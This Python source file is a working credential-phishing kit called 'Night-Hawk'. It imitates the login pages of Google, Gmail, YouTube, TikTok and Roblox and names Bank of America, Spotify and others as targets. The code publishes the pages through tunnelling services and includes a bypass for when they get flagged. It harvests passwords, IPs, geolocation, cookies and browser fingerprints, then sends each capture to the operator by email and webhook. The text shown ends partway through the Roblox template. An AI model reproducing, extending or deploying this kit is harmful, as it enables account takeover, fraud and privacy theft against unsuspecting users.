#!/usr/bin/env python3
"""
Night-Hawk :: OSINT > Phisher

Brand-accurate credential phishing. Cloudflare quick tunnel by default, with a
--bypass mode that falls through to localhost.run / serveo / localtunnel when
trycloudflare gets flagged.

  Sites: TikTok, YouTube, Bank of America, Google, Gmail,
         Fibre Federal, Roblox, Spotify

Per site it uses the real field names (username/password, identifier/Passwd,
onlineId1/passcode), the real favicon, canonical and page titles, so password
managers and Safe Browsing both read it as the genuine article. Wrong-password
re-ask, optional OTP step, crawler cloaking and auto-redirect to the real site.

Captures on every request: real IP past proxy headers, reverse DNS, ASN,
hosting/proxy flags, geo, full headers, cookies, UA, referer, browser
fingerprint (screen, tz, WebGL, canvas, WebRTC local IPs), and everything typed.

Alerts go out instantly to email and/or webhook, and everything is appended to
phish_data/events.jsonl plus phish_data/hits.csv.

  python tools/phisher.py --site gmail --retries 2 --otp
  python tools/phisher.py --site boa --bypass
"""

import argparse
import atexit
import base64
import csv
import json
import os
import queue
import re
import secrets
import shutil
import signal
import smtplib
import socket
import ssl
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from email.message import EmailMessage
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "..", "phish_data")
CONFIG_PATH = os.path.join(DATA_DIR, "config.json")
EVENTS_PATH = os.path.join(DATA_DIR, "events.jsonl")
HITS_CSV = os.path.join(DATA_DIR, "hits.csv")
ALERTS_LOG = os.path.join(DATA_DIR, "alerts.log")
BIN_DIR = os.path.join(DATA_DIR, "bin")

RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
GRAY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"

BANNER = r"""
    ______           __     ____  __    _      __  
   / ____/___ ______/ /_   / __ \/ /_  (_)____/ /_ 
  / /_  / __ `/ ___/ __/  / /_/ / __ \/ / ___/ __ \
 / __/ / /_/ (__  ) /_   / ____/ / / / (__  ) / / /
/_/    \__,_/____/\__/  /_/   /_/ /_/_/____/_/ /_/ 
"""

PIXEL = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")

HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "SAMEORIGIN",
    "X-Robots-Tag": "noindex, nofollow",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Permissions-Policy": "interest-cohort=()",
}

CFG = {
    "smtp_host": "", "smtp_port": 587, "smtp_user": "", "smtp_pass": "",
    "smtp_tls": "starttls", "alert_to": "", "webhook": "",
    "public_url": "", "bind": "0.0.0.0", "port": 8080, "slug": "",
    "site": "gmail", "retries": 1, "otp": False, "cloak": False,
    "redirect": True, "bypass": False,
}

STATE = {}
STATE_LOCK = threading.Lock()
GEO_CACHE = {}
GEO_LOCK = threading.Lock()
SESSIONS = {}
MAIL_Q = queue.Queue()
TUNNEL = {"proc": None, "url": "", "kind": ""}

SITES = ["tiktok", "youtube", "boa", "google", "gmail", "fibre", "roblox", "spotify"]


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def ensure_dirs():
    os.makedirs(DATA_DIR, exist_ok=True)
    os.makedirs(BIN_DIR, exist_ok=True)


def load_cfg():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH) as f:
                CFG.update(json.load(f))
        except (OSError, ValueError):
            pass
    for k in list(CFG):
        env = os.environ.get("PHISH_" + k.upper())
        if env:
            if k in ("port", "retries"):
                CFG[k] = int(env)
            elif k in ("otp", "cloak", "redirect", "bypass"):
                CFG[k] = env.lower() in ("1", "true", "yes")
            else:
                CFG[k] = env


def save_cfg():
    ensure_dirs()
    with open(CONFIG_PATH, "w") as f:
        json.dump(CFG, f, indent=2)
    os.chmod(CONFIG_PATH, 0o600)
def is_private(ip):
    try:
        p = [int(x) for x in ip.split(".")]
    except ValueError:
        return True
    if len(p) != 4:
        return True
    a, b = p[0], p[1]
    return (a == 10 or (a == 172 and 16 <= b <= 31) or (a == 192 and b == 168)
            or a == 127 or a == 0 or a >= 224)


def client_ip(h):
    chain = []
    for hdr in ("cf-connecting-ip", "true-client-ip", "x-real-ip",
                "x-forwarded-for", "forwarded"):
        v = h.headers.get(hdr)
        if v:
            chain += [x.strip().split("=")[-1].strip("\"") for x in v.split(",")]
    chain = [x for x in chain if x]
    peer = h.client_address[0]
    for c in chain:
        if not is_private(c):
            return c, chain, peer
    return peer, chain, peer


def geo(ip):
    if is_private(ip):
        return {"note": "private/loopback"}
    with GEO_LOCK:
        hit = GEO_CACHE.get(ip)
        if hit and time.time() - hit[0] < 600:
            return hit[1]
    fields = ("status,message,country,countryCode,region,regionName,city,zip,"
              "lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting")
    try:
        url = f"http://ip-api.com/json/{urllib.parse.quote(ip)}?fields={fields}"
        with urllib.request.urlopen(url, timeout=6) as r:
            out = json.loads(r.read().decode("utf-8", "ignore"))
    except Exception as e:
        out = {"error": str(e)}
    if not out.get("reverse"):
        try:
            out["reverse"] = socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror, OSError):
            out["reverse"] = ""
    with GEO_LOCK:
        GEO_CACHE[ip] = (time.time(), out)
    return out


def harvest(h, sid, site):
    ip, chain, peer = client_ip(h)
    return {
        "ts": now(), "site": site, "session": sid,
        "ip": ip, "x_forwarded_chain": chain, "peer": peer,
        "method": h.command, "path": h.path,
        "ua": h.headers.get("user-agent", ""),
        "referer": h.headers.get("referer", ""),
        "accept_language": h.headers.get("accept-language", ""),
        "dnt": h.headers.get("dnt", ""),
        "host": h.headers.get("host", ""),
        "cookies": h.headers.get("cookie", ""),
        "headers": dict(h.headers.items()),
        "geo": geo(ip),
        "first_seen": SESSIONS.setdefault(sid, now()),
    }


def store(rec, csv_row=None):
    ensure_dirs()
    with open(EVENTS_PATH, "a") as f:
        f.write(json.dumps(rec) + "\n")
    if csv_row:
        new = not os.path.exists(HITS_CSV)
        with open(HITS_CSV, "a", newline="") as f:
            w = csv.writer(f)
            if new:
                w.writerow(["ts", "site", "step", "ip", "country", "city",
                            "identity", "secret", "proxy", "hosting", "session"])
            w.writerow(csv_row)


def alert(rec, headline):
    line = (f"""{headline}\n"""
            f"""  site    : {rec["site"]}\n"""
            f"""  ip      : {rec["ip"]}\n"""
            f"""  geo     : {rec["geo"].get("city","?")}, {rec["geo"].get("country","?")}"""
            f""" | {rec["geo"].get("isp","?")} | proxy={rec["geo"].get("proxy")}\n"""
            f"""  ua      : {rec["ua"][:110]}\n"""
            f"""  session : {rec["session"]}\n""")
    print(f"\n{RED}{BOLD}!! CAPTURE{RESET} {line}", flush=True)
    ensure_dirs()
    with open(ALERTS_LOG, "a") as f:
        f.write(f"[{rec['ts']}] {line}\n{json.dumps(rec, indent=2)}\n\n")
    MAIL_Q.put((rec, headline))


def mailer():
    while True:
        rec, headline = MAIL_Q.get()
        try:
            if CFG.get("smtp_host") and CFG.get("alert_to"):
                send_mail(rec, headline)
            if CFG.get("webhook"):
                send_webhook(rec, headline)
        except Exception as e:
            print(f"{RED}[mail] {e}{RESET}", flush=True)
        finally:
            MAIL_Q.task_done()


def send_mail(rec, headline):
    msg = EmailMessage()
    msg["Subject"] = f"""[Night-Hawk] {rec["site"]} {headline} - {rec["ip"]}"""
    msg["From"] = CFG.get("smtp_user") or "phish@localhost"
    msg["To"] = CFG["alert_to"]
    body = "\n".join(f"{k}: {rec[k]}" for k in
                     ("ts", "site", "ip", "ua", "referer", "session"))
    msg.set_content(f"{headline}\n\n{body}\n\n"
                    f"Geo: {json.dumps(rec['geo'], indent=2)}\n\n"
                    f"Typed: {json.dumps(rec.get('data', {}), indent=2)}\n\n"
                    f"Fingerprint: {json.dumps(rec.get('fp', {}), indent=2)}\n")
    msg.add_attachment(json.dumps(rec, indent=2), subtype="json",
                       filename=f"capture-{rec['session']}.json")
    host, port = CFG["smtp_host"], int(CFG["smtp_port"])
    if CFG.get("smtp_tls") == "ssl":
        with smtplib.SMTP_SSL(host, port, timeout=20,
                              context=ssl.create_default_context()) as s:
            if CFG.get("smtp_user"):
                s.login(CFG["smtp_user"], CFG["smtp_pass"])
            s.send_message(msg)
    else:
        with smtplib.SMTP(host, port, timeout=20) as s:
            s.ehlo()
            if CFG.get("smtp_tls") == "starttls":
                s.starttls(context=ssl.create_default_context())
                s.ehlo()
            if CFG.get("smtp_user"):
                s.login(CFG["smtp_user"], CFG["smtp_pass"])
            s.send_message(msg)


def send_webhook(rec, headline):
    payload = {"content": f"""**{headline}** `{rec["site"]}` `{rec["ip"]}` """
                          f"""{rec["geo"].get("city","?")}/{rec["geo"].get("country","?")} """
                          f"""`{rec["ua"][:70]}`"""}
    req = urllib.request.Request(
        CFG["webhook"], data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=10).read()


def new_slug(n=6):
    return "".join(secrets.choice("abcdefghijkmnpqrstuvwxyz23456789") for _ in range(n))


def _spawn_scrape(cmd, pattern, wait, label):
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, bufsize=1)
    except OSError as e:
        print(f"{RED}[tunnel] {label} launch failed: {e}{RESET}")
        return ""
    TUNNEL["proc"] = proc
    atexit.register(stop_tunnel)
    found = threading.Event()
    box = {}

    def reader():
        for line in proc.stdout:
            m = re.search(pattern, line)
            if m and not found.is_set():
                box["url"] = m.group(0)
                found.set()
                break

    threading.Thread(target=reader, daemon=True).start()
    print(f"{RED}[tunnel] {label}: waiting for host...{RESET}")
    if not found.wait(wait):
        print(f"{RED}[tunnel] {label}: no host after {wait}s{RESET}")
        stop_tunnel()
        return ""
    print(f"{RED}{BOLD}[tunnel] live via {label}:{RESET} {box['url']}")
    return box["url"]


def find_cloudflared():
    hit = shutil.which("cloudflared")
    if hit:
        return hit
    local = os.path.join(BIN_DIR, "cloudflared")
    return local if os.path.exists(local) else None


def install_cloudflared():
    print(f"{RED}[tunnel] cloudflared missing, installing...{RESET}")
    for cmd in (["pkg", "install", "-y", "cloudflared"],
                ["apt-get", "install", "-y", "cloudflared"],
                ["brew", "install", "cloudflared"]):
        if shutil.which(cmd[0]):
            try:
                if subprocess.run(cmd, capture_output=True, timeout=180).returncode == 0:
                    if shutil.which("cloudflared"):
                        return shutil.which("cloudflared")
            except (subprocess.SubprocessError, OSError):
                pass
    arch = {"aarch64": "arm64", "armv7l": "arm", "armv8l": "arm64",
            "x86_64": "amd64", "i686": "386", "amd64": "amd64"}.get(
        os.uname().machine, "amd64")
    url = ("https://github.com/cloudflare/cloudflared/releases/latest/download/"
           f"cloudflared-linux-{arch}")
    dest = os.path.join(BIN_DIR, "cloudflared")
    try:
        with urllib.request.urlopen(url, timeout=120) as r, open(dest, "wb") as f:
            shutil.copyfileobj(r, f)
        os.chmod(dest, 0o755)
        return dest
    except Exception as e:
        print(f"{RED}[tunnel] cloudflared install failed: {e}{RESET}")
        return None


def tunnel_cloudflare(port, wait=45):
    bin_path = find_cloudflared() or install_cloudflared()
    if not bin_path:
        return ""
    return _spawn_scrape(
        [bin_path, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
        r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", wait, "cloudflare")


def tunnel_localhostrun(port, wait=45):
    if not shutil.which("ssh"):
        return ""
    return _spawn_scrape(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
         "-R", f"80:localhost:{port}", "nokey@localhost.run"],
        r"https://[a-zA-Z0-9.-]+\.lhr\.life", wait, "localhost.run")


def tunnel_serveo(port, wait=45):
    if not shutil.which("ssh"):
        return ""
    return _spawn_scrape(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
         "-R", f"80:localhost:{port}", "serveo.net"],
        r"https://[a-zA-Z0-9.-]+\.serveo\.net", wait, "serveo")


def tunnel_localtunnel(port, wait=45):
    if not shutil.which("npx"):
        return ""
    return _spawn_scrape(["npx", "--yes", "localtunnel", "--port", str(port)],
                         r"https://[a-zA-Z0-9.-]+\.loca\.lt", wait, "localtunnel")


def start_tunnel(port, bypass=False, wait=45):
    if not bypass:
        url = tunnel_cloudflare(port, wait)
        if url:
            TUNNEL["kind"] = "cloudflare"
            return url
        print(f"{RED}[tunnel] cloudflare failed, falling through{RESET}")
    for fn, name in ((tunnel_localhostrun, "localhost.run"),
                     (tunnel_serveo, "serveo"),
                     (tunnel_localtunnel, "localtunnel")):
        url = fn(port, wait)
        if url:
            TUNNEL["kind"] = name
            return url
    print(f"{RED}[tunnel] no tunnel available - LAN only{RESET}")
    return ""


def stop_tunnel():
    proc = TUNNEL.get("proc")
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except (subprocess.SubprocessError, OSError):
            proc.kill()
FP_JS = r"""
<script>
(function(){
  var fp={screen:screen.width+"x"+screen.height,depth:screen.colorDepth,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    off:new Date().getTimezoneOffset(),lang:navigator.language,
    langs:(navigator.languages||[]).join(","),plat:navigator.platform,
    cores:navigator.hardwareConcurrency||0,mem:navigator.deviceMemory||0,
    touch:(navigator.maxTouchPoints||0)>0,cookies:navigator.cookieEnabled,
    dnt:navigator.doNotTrack||"",ua:navigator.userAgent,ips:[]};
  try{var c=document.createElement("canvas"),x=c.getContext("2d");
    x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";
    x.fillRect(0,0,30,30);x.fillStyle="#069";x.fillText("hawk",2,2);
    fp.canvas=c.toDataURL().slice(-48);}catch(e){}
  try{var g=document.createElement("canvas").getContext("webgl");
    var d=g.getExtension("WEBGL_debug_renderer_info");
    fp.webgl=g.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch(e){}
  try{var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    pc.createDataChannel("x");
    pc.onicecandidate=function(e){if(!e.candidate)return;
      var m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if(m&&fp.ips.indexOf(m[1])<0){fp.ips.push(m[1]);send();}};
    pc.createOffer().then(function(o){pc.setLocalDescription(o);});}catch(e){}
  var sent=0;
  function send(){if(sent)return;sent=1;
    fetch("/fp",{method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify(fp),keepalive:true}).catch(function(){});}
  setTimeout(send,2500);
})();
</script>
"""

TRACK = """<img src="/pixel.gif" width="1" height="1" alt="">"""

G_SVG = ("""<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 """
         """30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 """
         """24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02"""
         """h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>"""
         """<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59"""
         """l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>"""
         """<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45"""
         """-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 """
         """24 48z"/>""")

FAVICONS = {
    "google": G_SVG,
    "gmail": G_SVG,
    "youtube": ("""<path fill="#FF0000" d="M6 4h12a4 4 0 0 1 4 4v8a4 4 0 0 1-4 4H6a4 4 0 0 1"""
                """-4-4V8a4 4 0 0 1 4-4z"/><path fill="#fff" d="M10 8.5v7l6-3.5z"/>"""),
    "tiktok": ("""<path fill="#25F4EE" d="M17 5.6a5 5 0 0 1-1.2-2.6h-2.3v11a2.3 2.3 0 1 1"""
               """-2.3-2.3c.24 0 .47.03.7.1V9.4a4.6 4.6 0 1 0 3.9 4.6V8a7.3 7.3 0 0 0 """
               """3.8 1.1V6.8a5 5 0 0 1-2.6-1.2z"/>"""
               """<path fill="#FE2C55" opacity=".75" transform="translate(1.2 1)" """
               """d="M17 5.6a5 5 0 0 1-1.2-2.6h-2.3v11a2.3 2.3 0 1 1-2.3-2.3c.24 0 .47.03.7.1"""
               """V9.4a4.6 4.6 0 1 0 3.9 4.6V8a7.3 7.3 0 0 0 3.8 1.1V6.8a5 5 0 0 1-2.6-1.2z"/>"""),
    "boa": ("""<path fill="#e31837" d="M2 5h20l-2 3H2z"/><path fill="#012169" d="M2 10h20"""
            """l-2 3H2z"/><path fill="#e31837" d="M2 15h20l-2 3H2z"/>"""),
    "fibre": ("""<path fill="#0a4d8c" d="M12 2 3 7v10l9 5 9-5V7z"/><path fill="#fff" """
              """d="M11 7h2v6h-2z"/><circle cx="12" cy="16" r="1.3" fill="#fff"/>"""),
    "roblox": ("""<rect x="4" y="4" width="16" height="16" rx="2" fill="#000" """
               """transform="rotate(-8 12 12)"/><rect x="10" y="10" width="4" height="4" """
               """fill="#fff" transform="rotate(-8 12 12)"/>"""),
    "spotify": ("""<circle cx="12" cy="12" r="10" fill="#1DB954"/>"""
                """<path fill="none" stroke="#fff" stroke-width="1.8" stroke-linecap="round" """
                """d="M7.5 9.5c3-1 6.5-.7 9 .8M8 12.6c2.5-.8 5.4-.5 7.5.8M8.6 15.5"""
                """c2-.6 4.3-.4 6 .6"/>"""),
}


def favicon(site):
    body = FAVICONS.get(site, G_SVG)
    return ("""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" """
            f"""width="32" height="32">{body}</svg>""")


META = {
    "google": ("#1a73e8", "https://accounts.google.com/"),
    "gmail": ("#1a73e8", "https://accounts.google.com/"),
    "youtube": ("#FF0000", "https://accounts.google.com/"),
    "tiktok": ("#FE2C55", "https://www.tiktok.com/login"),
    "boa": ("#e31837", "https://www.bankofamerica.com/"),
    "fibre": ("#0a4d8c", "https://www.fibrecu.com/"),
    "roblox": ("#00A2FF", "https://www.roblox.com/login"),
    "spotify": ("#1DB954", "https://accounts.spotify.com/login"),
}

BASE_CSS = """
<style>
*{box-sizing:border-box}
body{margin:0;font-family:Roboto,arial,sans-serif;color:#202124;font-size:16px;
     -webkit-font-smoothing:antialiased}
.wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;
      padding:24px 12px}
.card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;
      padding:48px 40px 36px;background:#fff}
.g{width:48px;height:48px;display:block;margin:0 auto 16px}
h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 8px;letter-spacing:-.2px}
.sub{font-size:16px;text-align:center;margin:0 0 28px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;
      font-size:16px;outline:none;background:transparent;color:#202124}
input:focus{border:2px solid #1a73e8;padding:12px 14px}
.link{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;
      display:inline-block;margin-top:10px}
.row{display:flex;align-items:center;justify-content:space-between;margin-top:36px}
button{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:0 24px;
       height:36px;font-size:14px;font-weight:500;cursor:pointer;min-width:88px}
button:hover{background:#1b66c9;box-shadow:0 1px 2px rgba(60,64,67,.3)}
.chip{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:16px;
      padding:4px 10px 4px 4px;font-size:14px;width:fit-content;margin:0 auto 24px;
      max-width:100%;overflow:hidden}
.av{width:20px;height:20px;border-radius:50%;background:#1a73e8;color:#fff;font-size:11px;
    display:flex;align-items:center;justify-content:center;text-transform:uppercase;
    flex:0 0 20px}
.show{display:flex;align-items:center;gap:10px;font-size:14px;margin-top:16px}
.show input{width:auto;padding:0}
.err{background:#fce8e6;color:#c5221f;font-size:14px;padding:10px 14px;border-radius:4px;
     margin-bottom:20px}
.foot{display:flex;justify-content:space-between;align-items:center;font-size:12px;
      color:#5f6368;margin-top:40px;flex-wrap:wrap;gap:8px}
.foot a{color:#5f6368;text-decoration:none;padding:0 6px}
</style>
"""


def doc(title, site, body, extra_css=""):
    theme, canon = META.get(site, ("#1a73e8", "https://www.google.com/"))
    return f"""<!doctype html><html lang="en" dir="ltr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<meta name="theme-color" content="{theme}">
<meta name="referrer" content="origin">
<link rel="icon" href="/favicon/{site}.svg" type="image/svg+xml">
<link rel="apple-touch-icon" href="/favicon/{site}.svg">
<link rel="canonical" href="{canon}">
{BASE_CSS}{extra_css}</head><body>{body}{FP_JS}{TRACK}</body></html>"""


GFOOT = ("""<div class="foot"><select aria-label="Change language" """
         """style="border:0;font-size:12px;color:#5f6368;background:transparent">"""
         """<option>English (United States)</option></select>"""
         """<div><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>""")

GHIDDEN = ("""<input type="hidden" name="service" value="mail">"""
           f"""<input type="hidden" name="dsh" value="{secrets.token_hex(16)}">""")


def tpl_google(step, ident="", err="", site="google"):
    e = f"""<div class="err">{err}</div>""" if err else ""
    if step == "ident":
        form = f"""<form method="post" action="/{site}" novalidate>
{GHIDDEN}<input type="hidden" name="step" value="ident">
<input name="identifier" type="email" placeholder="Email or phone" required autofocus
 autocomplete="username" spellcheck="false" autocapitalize="none" dir="ltr"
 aria-label="Email or phone">
<a class="link" href="#">Forgot email?</a>
<div class="row"><a class="link" style="margin:0" href="#">Create account</a>
<button type="submit">Next</button></div></form>"""
        head = "<h1>Sign in</h1>"
    else:
        form = f"""<form method="post" action="/{site}" novalidate>
{GHIDDEN}<input type="hidden" name="step" value="pass">
<input type="hidden" name="identifier" value="{ident}">
<input name="Passwd" type="password" placeholder="Enter your password" required autofocus
 autocomplete="current-password" spellcheck="false" dir="ltr"
 aria-label="Enter your password">
<label class="show"><input type="checkbox" onclick="var p=document.querySelector(
 'input[name=Passwd]');p.type=p.type==='password'?'text':'password'"> Show password</label>
<div class="row"><a class="link" style="margin:0" href="#">Forgot password?</a>
<button type="submit">Next</button></div></form>"""
        head = (f"""<h1>Welcome</h1><div class="chip"><div class="av">{(ident or "?")[:1]}"""
                f"""</div><span style="overflow:hidden;text-overflow:ellipsis">{ident}"""
                f"""</span></div>""")
    return doc("Sign in - Google Accounts", site,
               f"""<div class="wrap"><div class="card">{e}"""
               f"""<svg class="g" viewBox="0 0 48 48">{G_SVG}</svg>{head}"""
               f"""<p class="sub">to continue to Google</p>{form}{GFOOT}</div></div>""")


def tpl_youtube(step, ident="", err=""):
    e = f"""<div class="err">{err}</div>""" if err else ""
    yt = ("""<svg viewBox="0 0 90 20" style="width:90px;height:20px;display:block;"""
          """margin:0 auto 20px"><path fill="#FF0000" d="M27.9 3.1A3.6 3.6 0 0 0 25.4.6"""
          """C23.2 0 14.3 0 14.3 0S5.4 0 3.1.6A3.6 3.6 0 0 0 .6 3.1C0 5.4 0 10 0 10s0 4.6.6 6.9"""
          """a3.6 3.6 0 0 0 2.5 2.5c2.3.6 11.2.6 11.2.6s8.9 0 11.1-.6a3.6 3.6 0 0 0 2.5-2.5"""
          """c.6-2.3.6-6.9.6-6.9s0-4.6-.6-6.9z"/><path fill="#fff" d="M11.4 14.3 18.9 10"""
          """l-7.5-4.3z"/><text x="33" y="15" font-family="Roboto,Arial" font-size="15" """
          """font-weight="700" fill="#282828">YouTube</text></svg>""")
    if step == "ident":
        form = f"""<form method="post" action="/youtube" novalidate>
{GHIDDEN}<input type="hidden" name="step" value="ident">
<input name="identifier" type="email" placeholder="Email or phone" required autofocus
 autocomplete="username" spellcheck="false" autocapitalize="none" dir="ltr">
<a class="link" href="#">Forgot email?</a>
<div class="row"><a class="link" style="margin:0" href="#">Create account</a>
<button type="submit">Next</button></div></form>"""
        head = "<h1>Sign in</h1>"
    else:
        form = f"""<form method="post" action="/youtube" novalidate>
{GHIDDEN}<input type="hidden" name="step" value="pass">
<input type="hidden" name="identifier" value="{ident}">
<input name="Passwd" type="password" placeholder="Enter your password" required autofocus
 autocomplete="current-password" spellcheck="false" dir="ltr">
<label class="show"><input type="checkbox" onclick="var p=document.querySelector(
 'input[name=Passwd]');p.type=p.type==='password'?'text':'password'"> Show password</label>
<div class="row"><a class="link" style="margin:0" href="#">Forgot password?</a>
<button type="submit">Next</button></div></form>"""
        head = (f"""<h1>Welcome</h1><div class="chip"><div class="av">{(ident or "?")[:1]}"""
                f"""</div><span style="overflow:hidden;text-overflow:ellipsis">{ident}"""
                f"""</span></div>""")
    return doc("Sign in - Google Accounts", "youtube",
               f"""<div class="wrap"><div class="card">{e}{yt}{head}"""
               f"""<p class="sub">to continue to YouTube</p>{form}{GFOOT}</div></div>""")
def tpl_tiktok(step, ident="", err=""):
    e = f"""<div class="err">{err}</div>""" if err else ""
    css = """<style>
body{background:#fff;font-family:-apple-system,Proxima Nova,Arial,sans-serif}
.card{border:0;max-width:483px;padding:0 32px 32px}
h1{font-size:32px;font-weight:700;margin:0 0 6px;text-align:center;letter-spacing:-.5px}
.sub{font-size:15px;color:#161823;margin:0 0 24px;text-align:center}
button{background:#FE2C55;width:100%;height:46px;border-radius:4px;font-size:16px;
       font-weight:600;color:#fff;margin-top:16px}
button:hover{background:#e8264c}
input{height:44px;background:#f1f1f2;border:1px solid rgba(22,24,35,.12);border-radius:4px}
input:focus{border:1px solid rgba(22,24,35,.35);padding:12px 14px}
.divider{display:flex;align-items:center;gap:12px;color:rgba(22,24,35,.5);font-size:13px;
         margin:20px 0}
.divider:before,.divider:after{content:"";flex:1;height:1px;background:rgba(22,24,35,.12)}
.alt{display:flex;flex-direction:column;gap:10px}
.alt a{display:block;text-align:center;padding:11px;border:1px solid rgba(22,24,35,.12);
       border-radius:4px;font-size:14px;font-weight:600;color:#161823;text-decoration:none}
.foot{justify-content:center;border-top:1px solid rgba(22,24,35,.12);padding-top:18px;
      margin-top:22px;color:rgba(22,24,35,.75)}
.foot a{color:#FE2C55;font-weight:600}
.tt{width:38px;height:38px;display:block;margin:0 auto 20px}
</style>"""
    logo = ("""<svg class="tt" viewBox="0 0 24 24"><path fill="#000" d="M17 5.6a5 5 0 0 1-1.2"""
            """-2.6h-2.3v11a2.3 2.3 0 1 1-2.3-2.3c.24 0 .47.03.7.1V9.4a4.6 4.6 0 1 0 3.9 4.6V8"""
            """a7.3 7.3 0 0 0 3.8 1.1V6.8a5 5 0 0 1-2.6-1.2z"/></svg>""")
    if step == "ident":
        form = f"""<form method="post" action="/tiktok" novalidate>
<input type="hidden" name="step" value="ident">
<input name="username" type="text" placeholder="Email or username" required autofocus
 autocomplete="username" spellcheck="false" autocapitalize="none">
<a class="link" href="#">Forgot password?</a>
<button type="submit">Log in</button></form>"""
    else:
        form = f"""<form method="post" action="/tiktok" novalidate>
<input type="hidden" name="step" value="pass">
<input type="hidden" name="username" value="{ident}">
<input name="password" type="password" placeholder="Password" required autofocus
 autocomplete="current-password">
<a class="link" href="#">Forgot password?</a>
<button type="submit">Log in</button></form>"""
    return doc("TikTok - Make Your Day", "tiktok",
               f"""<div class="wrap"><div class="card">{logo}{e}<h1>Log in to TikTok</h1>"""
               f"""<p class="sub">Manage your account, check notifications, comment on """
               f"""videos, and more.</p>{form}<div class="divider">or</div>"""
               f"""<div class="alt"><a href="#">Continue with Google</a>"""
               f"""<a href="#">Continue with Facebook</a></div>"""
               f"""<div class="foot">Don&rsquo;t have an account? <a href="#">Sign up</a>"""
               f"""</div></div></div>""", css)


def tpl_roblox(step, ident="", err=""):
    e = f"""<div class="err">{err}</div>""" if err else ""
    css = """<style>
body{background:#f2f4f5;font-family:Builder Sans,Helvetica,Arial,sans-serif;color:#232527}
.card{border:0;border-radius:8px;max-width:420px;box-shadow:0 4px 24px rgba(0,0,0,.12);
      padding:36px 32px}
h1{font-size:26px;font-weight:700;margin:0 0 22px;text-align:center}
label{display:block;font-size:13px;font-weight:700;margin:0 0 6px;text-align:left}
input{border:1px solid #c3c8cc;border-radius:6px;height:46px;background:#fff;font-size:15px}
input:focus{border:2px solid #00A2FF;padding:12px 14px}
button{background:#00A2FF;width:100%;height:46px;border-radius:6px;font-size:16px;
       font-weight:700;margin-top:20px;color:#fff}
button:hover{background:#0089d6}
.foot{justify-content:center;color:#5b6166;margin-top:20px;font-size:13px;
      border-top:1px solid #dfe3e6;padding-top:16px}
.foot a{color:#00A2FF;font-weight:600}
.rb{width:44px;height:44px;display:block;margin:0 auto 18px}
.field{margin-bottom:14px}
</style>"""
    logo = ("""<svg class="rb" viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" """
            """rx="2" fill="#000" transform="rotate(-8 12 12)"/><rect x="10" y="10" width="4" """
            """height="4" fill="#fff" transform="rotate(-8 12 12)"/></svg>""")
    if step == "ident":
        form = f"""<form method="post" action="/roblox" novalidate>
<input type="hidden" name="step" value="ident">
<div class="field"><label>Username</label>
<input name="username" type="text" autocomplete="username" required autofocus
 spellcheck="false" autocapitalize="none"></div>
<button type="submit">Log In</button></form>"""
    else:
        form = f"""<form method="post" action="/roblox" novalidate>
<input type="hidden" name="step" value="pass">
<input type="hidden" name="username" value="{ident}">
<div class="field"><label>Username</label>
<input value="{ident}" readonly style="background:#eef1f3"></div>
<div class="field"><label>Password</label>
<input name="password" type="password" autocomplete="current-password" required autofocus>
<a class="link" href="#">Forgot password?</a></div>
<button type="submit">Log In</button></form>"""
